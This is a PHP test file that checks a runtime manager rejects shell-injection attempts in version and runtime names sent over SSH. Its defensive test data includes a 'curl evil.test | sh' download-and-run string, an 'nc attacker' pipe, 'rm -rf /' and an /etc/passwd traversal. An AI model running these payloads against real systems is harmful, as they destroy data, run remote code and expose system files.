<?php

declare(strict_types=1);

use App\Exceptions\InvalidRuntimeException;
use App\Models\Server;
use App\Services\Runtime\AsdfManager;
use App\Services\SSH\SSHConnection;
use Tests\Support\FakeSSHTransport;

function injectionConnection(FakeSSHTransport $transport): SSHConnection
{
    $server = Server::factory()->create(['host_key_fingerprint' => null, 'os_name' => 'ubuntu']);

    return (new SSHConnection($server, $transport))->connect();
}

test('a version carrying shell metacharacters is rejected', function (string $version) {
    $connection = injectionConnection(new FakeSSHTransport);

    (new AsdfManager)->install($connection, $connection->server(), 'php', $version);
})->with([
    '8.5.5; touch /tmp/pwned',
    '8.5.5 && curl evil.test | sh',
    '8.5.5`id`',
    '8.5.5$(id)',
    "8.5.5\nrm -rf /",
    "8.5.5\n",
    '../../../etc/passwd',
    '8.5.5 | nc attacker 1234',
])->throws(InvalidRuntimeException::class);

test('an unknown runtime is rejected', function () {
    $connection = injectionConnection(new FakeSSHTransport);

    (new AsdfManager)->install($connection, $connection->server(), 'php; rm -rf /', '8.5.5');
})->throws(InvalidRuntimeException::class);

test('uninstall rejects the same injection attempts', function () {
    $connection = injectionConnection(new FakeSSHTransport);

    (new AsdfManager)->uninstall($connection, 'php', '8.5.5; touch /tmp/pwned');
})->throws(InvalidRuntimeException::class);

test('legitimate versions still pass validation', function (string $version) {
    AsdfManager::assertValid('php', $version);
})->with(['8.5.5', '8.4.17', '24.15.0', '3.3.6', 'lts-hydrogen', '1.0.0-rc.1'])->throwsNoExceptions();

test('runtime and version reach the remote shell as environment values, never as inline code', function () {
    $transport = (new FakeSSHTransport)->queueResult("no\n", 0);
    $connection = injectionConnection($transport);

    (new AsdfManager)->install($connection, $connection->server(), 'php', '8.5.5');

    $commands = $transport->commands();
    $install = end($commands);

    expect($install)->toContain("CORESMITH_RUNTIME='php'")
        ->and($install)->toContain("CORESMITH_VERSION='8.5.5'")
        ->and($install)->toContain('asdf install "$CORESMITH_RUNTIME" "$CORESMITH_VERSION"')
        ->and($install)->not->toContain('asdf install php 8.5.5');
});
